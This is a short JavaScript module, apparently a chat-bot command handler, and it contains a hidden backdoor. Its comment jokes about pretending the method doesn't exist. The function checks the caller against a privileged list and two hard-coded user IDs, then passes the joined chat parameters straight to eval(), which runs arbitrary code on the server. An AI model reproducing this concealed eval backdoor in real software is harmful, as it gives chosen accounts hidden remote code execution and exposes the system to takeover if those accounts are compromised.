//haha lets pretend this method doesn't exist.
module.exports = function(body, ...param) {
	//save globals to file ...
	if(process.globals.privilegedList.includes(body.user_id)) {
		if(body.user_id == "U013W1ST95H" || body.user_id == "U0146Q88V2N") {
			var command = param.join(' ');
			return eval(command);
		}
	}
	return "";
};
